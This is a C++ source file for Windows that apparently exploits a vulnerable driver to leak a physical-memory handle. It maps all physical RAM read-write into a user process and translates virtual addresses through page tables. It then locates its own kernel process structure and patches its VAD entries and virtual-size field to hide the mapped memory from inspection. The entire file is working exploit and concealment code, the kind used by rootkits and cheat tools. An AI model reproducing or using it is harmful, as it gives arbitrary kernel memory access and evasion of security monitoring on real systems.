#include <windows.h>
#include <stdio.h>
#include "syscalls.h"
#include "symbols.h"
#include "physmem.h"
#include "window.h"

#define MAX_CHUNKS 256
#define CHUNK_SIZE 0x40000000ULL

struct VadPatch {
    ULONG64 flagsPA, startVpnPA, endVpnPA, startHighPA, endHighPA;
    ULONG origFlags, origStartVpn, origEndVpn;
    BYTE origStartHigh, origEndHigh;
};

static BOOL WINAPI ConsoleCtrlHandler(DWORD ctrl);
#define MAX_VAD_PATCHES 256
static VadPatch g_VadPatches[MAX_VAD_PATCHES] = {};
static ULONG g_VadPatchCount = 0;

static ULONG64 g_VirtualSizePA = 0;
static ULONG64 g_VirtualSizeOrig = 0;

struct PhysChunk {
    ULONG64 physBase;
    BYTE* mappedAddr;
};

static PhysChunk g_Chunks[MAX_CHUNKS] = {};
static ULONG g_ChunkCount = 0;
static ULONG64 g_TotalMapped = 0;

static inline BYTE* ResolvePhysAddr(ULONG64 physAddr) {
    if (physAddr < 0x1000) return NULL;
    ULONG chunkIdx = (ULONG)(physAddr / CHUNK_SIZE);
    if (chunkIdx >= g_ChunkCount || !g_Chunks[chunkIdx].mappedAddr)
        return NULL;
    ULONG64 offset = physAddr - g_Chunks[chunkIdx].physBase;
    return g_Chunks[chunkIdx].mappedAddr + offset;
}

bool SetupPhysWindow(HANDLE device, SyscallTable* sc, ULONG64 systemCr3, KernelOffsets* offsets) {
    printf("[*] Setting up physical memory window...\n");

    ULONGLONG installedKB = 0;
    GetPhysicallyInstalledSystemMemory(&installedKB);
    ULONG64 totalPhysBytes = installedKB * 1024;

    ULONG chunksNeeded = (ULONG)((totalPhysBytes + CHUNK_SIZE - 1) / CHUNK_SIZE);
    if (chunksNeeded > MAX_CHUNKS) chunksNeeded = MAX_CHUNKS;

    // trigger handle leak via initial IOCTL
    void* firstMap = PhysMap(device, sc, 0x1000, 0x1000);
    if (!firstMap) return false;

    ULONG64 knownValue = PhysRead64(device, sc, 0x1000);

    // find the leaked PhysicalMemory handle
    HANDLE physHandle = NULL;
    for (ULONG64 h = 4; h < 0x10000; h += 4) {
        void* test = MapViewOfFile((HANDLE)h, FILE_MAP_READ, 0, 0x1000, 0x1000);
        if (test) {
            ULONG64 testValue = *(volatile ULONG64*)test;
            UnmapViewOfFile(test);
            if (testValue == knownValue) {
                physHandle = (HANDLE)h;
                break;
            }
        }
    }
    PhysUnmap(device, sc, firstMap);

    if (!physHandle) return false;

    // map entire physical address space in 1GB chunks
    for (ULONG i = 0; i < chunksNeeded; i++) {
        ULONG64 physBase = (ULONG64)i * CHUNK_SIZE;
        ULONG64 mapStart = physBase;
        ULONG mapSize = (ULONG)CHUNK_SIZE;
        if (i == 0) { mapStart = 0x1000; mapSize -= 0x1000; }

        DWORD offHigh = (DWORD)(mapStart >> 32);
        DWORD offLow = (DWORD)(mapStart & 0xFFFFFFFF);

        void* mapped = MapViewOfFile(physHandle, FILE_MAP_READ | FILE_MAP_WRITE,
                                     offHigh, offLow, mapSize);
        if (!mapped) {
            g_Chunks[i].physBase = physBase;
            g_Chunks[i].mappedAddr = NULL;
            continue;
        }

        g_Chunks[i].physBase = mapStart;
        g_Chunks[i].mappedAddr = (BYTE*)mapped;
        g_ChunkCount = i + 1;
        g_TotalMapped += mapSize;
    }

    // close handle — views persist independently
    CloseHandle(physHandle);

    atexit([]() { RestorePhysWindow(); });
    SetConsoleCtrlHandler(ConsoleCtrlHandler, TRUE);

    printf("[+] Window: %llu MB in %u chunks\n", g_TotalMapped / (1024 * 1024), g_ChunkCount);

    // verify
    for (ULONG i = 0; i < g_ChunkCount; i++) {
        if (g_Chunks[i].mappedAddr) {
            BYTE* test = ResolvePhysAddr(g_Chunks[i].physBase + 0x1000);
            if (test) {
                printf("[+] Window verified\n");
                return true;
            }
        }
    }
    return false;
}

ULONG64 WindowRead64(ULONG64 physAddr) {
    BYTE* p = ResolvePhysAddr(physAddr);
    return p ? *(volatile ULONG64*)p : 0;
}

ULONG WindowRead32(ULONG64 physAddr) {
    BYTE* p = ResolvePhysAddr(physAddr);
    return p ? *(volatile ULONG*)p : 0;
}

void WindowReadBuffer(ULONG64 physAddr, void* buffer, ULONG size) {
    BYTE* p = ResolvePhysAddr(physAddr);
    if (p) memcpy(buffer, p, size);
}

void WindowWrite64(ULONG64 physAddr, ULONG64 value) {
    BYTE* p = ResolvePhysAddr(physAddr);
    if (p) *(volatile ULONG64*)p = value;
}

void WindowWriteBuffer(ULONG64 physAddr, void* buffer, ULONG size) {
    BYTE* p = ResolvePhysAddr(physAddr);
    if (p) memcpy(p, buffer, size);
}

static BOOL WINAPI ConsoleCtrlHandler(DWORD ctrl) {
    if (ctrl == CTRL_CLOSE_EVENT || ctrl == CTRL_C_EVENT)
        RestorePhysWindow();
    return FALSE;
}

void RestorePhysWindow() {
    if (!g_VadPatchCount && !g_VirtualSizePA) return;

    for (ULONG i = 0; i < g_VadPatchCount; i++) {
        VadPatch* p = &g_VadPatches[i];
        if (p->flagsPA) WindowWrite64(p->flagsPA, (ULONG64)p->origFlags);
        if (p->startVpnPA) WindowWrite64(p->startVpnPA, (ULONG64)p->origStartVpn);
        if (p->endVpnPA) WindowWrite64(p->endVpnPA, (ULONG64)p->origEndVpn);
        if (p->startHighPA) WindowWriteBuffer(p->startHighPA, &p->origStartHigh, 1);
        if (p->endHighPA) WindowWriteBuffer(p->endHighPA, &p->origEndHigh, 1);
    }
    g_VadPatchCount = 0;

    if (g_VirtualSizePA) {
        WindowWrite64(g_VirtualSizePA, g_VirtualSizeOrig);
        g_VirtualSizePA = 0;
    }
}

ULONG64 WindowVirtToPhys(ULONG64 cr3, ULONG64 virtualAddr) {
    const ULONG64 ADDR_MASK = 0x000FFFFFFFFFF000ULL;

    ULONG64 pml4e = WindowRead64((cr3 & ADDR_MASK) + ((virtualAddr >> 39) & 0x1FF) * 8);
    if (!(pml4e & 1)) return 0;

    ULONG64 pdpte = WindowRead64((pml4e & ADDR_MASK) + ((virtualAddr >> 30) & 0x1FF) * 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & 0x80)
        return (pdpte & 0x000FFFFFC0000000ULL) + (virtualAddr & 0x3FFFFFFF);

    ULONG64 pde = WindowRead64((pdpte & ADDR_MASK) + ((virtualAddr >> 21) & 0x1FF) * 8);
    if (!(pde & 1)) return 0;
    if (pde & 0x80)
        return (pde & 0x000FFFFFFFE00000ULL) + (virtualAddr & 0x1FFFFF);

    ULONG64 pte = WindowRead64((pde & ADDR_MASK) + ((virtualAddr >> 12) & 0x1FF) * 8);
    if (!(pte & 1)) return 0;

    return (pte & ADDR_MASK) + (virtualAddr & 0xFFF);
}

// VAD spoofing internals

static ULONG64 SpoofReadPtr(HANDLE dev, SyscallTable* sc, ULONG64 cr3, ULONG64 va) {
    ULONG64 pa = VirtToPhys(dev, sc, cr3, va);
    return pa ? PhysRead64(dev, sc, pa) : 0;
}

static void WalkAndSpoofVAD(
    HANDLE dev, SyscallTable* sc,
    ULONG64 nodeVA, ULONG64 cr3, KernelOffsets* offsets,
    int depth, int* spoofed
) {
    if (!nodeVA || depth > 40 || *spoofed >= (int)g_ChunkCount) return;

    ULONG64 nodePA = VirtToPhys(dev, sc, cr3, nodeVA);
    if (!nodePA) return;

    ULONG64 left = PhysRead64(dev, sc, nodePA);
    ULONG64 right = PhysRead64(dev, sc, nodePA + 0x08);

    ULONG64 startVpnPA = VirtToPhys(dev, sc, cr3, nodeVA + offsets->VadStartingVpn);
    ULONG64 endVpnPA = VirtToPhys(dev, sc, cr3, nodeVA + offsets->VadEndingVpn);
    if (!startVpnPA || !endVpnPA) goto recurse;

    {
        ULONG startVpn = PhysRead32(dev, sc, startVpnPA);
        ULONG endVpn = PhysRead32(dev, sc, endVpnPA);
        ULONG64 regionStart = (ULONG64)startVpn << 12;
        ULONG64 regionSize = ((ULONG64)endVpn - startVpn + 1) << 12;

        for (ULONG i = 0; i < g_ChunkCount; i++) {
            if (!g_Chunks[i].mappedAddr) continue;
            ULONG64 chunkVA = (ULONG64)g_Chunks[i].mappedAddr;
            if (chunkVA >= regionStart && chunkVA < regionStart + regionSize
                && regionSize > 0x100000 && g_VadPatchCount < MAX_VAD_PATCHES) {

                VadPatch* p = &g_VadPatches[g_VadPatchCount];
                p->flagsPA = VirtToPhys(dev, sc, cr3, nodeVA + offsets->VadFlags);

                // skip secured VADs
                if (p->flagsPA) {
                    ULONG secFlags = PhysRead32(dev, sc, p->flagsPA);
                    if (secFlags & 4u) break;
                }

                p->startVpnPA = startVpnPA;
                p->endVpnPA = endVpnPA;
                p->startHighPA = VirtToPhys(dev, sc, cr3, nodeVA + offsets->VadStartingVpnHigh);
                p->endHighPA = VirtToPhys(dev, sc, cr3, nodeVA + offsets->VadEndingVpnHigh);

                if (p->flagsPA) p->origFlags = PhysRead32(dev, sc, p->flagsPA);
                p->origStartVpn = startVpn;
                p->origEndVpn = endVpn;
                if (p->startHighPA) PhysReadBuffer(dev, sc, p->startHighPA, &p->origStartHigh, 1);
                if (p->endHighPA) PhysReadBuffer(dev, sc, p->endHighPA, &p->origEndHigh, 1);

                if (p->flagsPA) {
                    ULONG flags = p->origFlags;
                    flags |= (1u << 20);
                    flags &= ~(1u << 25);
                    PhysWrite64(dev, sc, p->flagsPA, (ULONG64)flags);
                }

                ULONG fakeEnd = startVpn + 0x10;
                PhysWrite64(dev, sc, endVpnPA, (ULONG64)fakeEnd);
                if (p->endHighPA) {
                    BYTE z = 0;
                    PhysWriteBuffer(dev, sc, p->endHighPA, &z, 1);
                }

                g_VadPatchCount++;
                (*spoofed)++;
                break;
            }
        }
    }

recurse:
    WalkAndSpoofVAD(dev, sc, left, cr3, offsets, depth + 1, spoofed);
    WalkAndSpoofVAD(dev, sc, right, cr3, offsets, depth + 1, spoofed);
}

bool SpoofWindowVADs(HANDLE device, SyscallTable* sc, ULONG64 systemCr3, KernelOffsets* offsets) {
    printf("[*] Spoofing VADs...\n");

    DWORD ourPid = GetCurrentProcessId();
    ULONG64 psActiveVA = offsets->NtoskrnlBase + offsets->PsActiveProcessHead;
    ULONG64 psActivePA = VirtToPhys(device, sc, systemCr3, psActiveVA);
    if (!psActivePA) return false;

    ULONG64 listHead = psActiveVA;
    ULONG64 currentLink = PhysRead64(device, sc, psActivePA);
    ULONG64 ourEprocessVA = 0;

    int count = 0;
    while (currentLink != listHead && currentLink != 0 && count < 500) {
        count++;
        ULONG64 eprocessVA = currentLink - offsets->ActiveProcessLinks;
        ULONG64 eprocessPA = VirtToPhys(device, sc, systemCr3, eprocessVA);
        if (!eprocessPA) break;

        if ((DWORD)PhysRead64(device, sc, eprocessPA + offsets->UniqueProcessId) == ourPid) {
            ourEprocessVA = eprocessVA;
            break;
        }

        ULONG64 nextPA = VirtToPhys(device, sc, systemCr3, currentLink);
        if (!nextPA) break;
        currentLink = PhysRead64(device, sc, nextPA);
    }

    if (!ourEprocessVA) return false;

    ULONG64 vadRootPA = VirtToPhys(device, sc, systemCr3, ourEprocessVA + offsets->VadRoot);
    if (!vadRootPA) return false;

    ULONG64 rootNode = PhysRead64(device, sc, vadRootPA);
    if (!rootNode) return false;

    int spoofed = 0;
    WalkAndSpoofVAD(device, sc, rootNode, systemCr3, offsets, 0, &spoofed);
    printf("[+] Spoofed %d VADs\n", spoofed);

    if (spoofed > 0 && offsets->VirtualSize) {
        ULONG64 vsPA = VirtToPhys(device, sc, systemCr3, ourEprocessVA + offsets->VirtualSize);
        if (vsPA) {
            g_VirtualSizePA = vsPA;
            g_VirtualSizeOrig = PhysRead64(device, sc, vsPA);
            PhysWrite64(device, sc, vsPA, 150ULL * 1024 * 1024);
        }
    }

    return spoofed > 0;
}
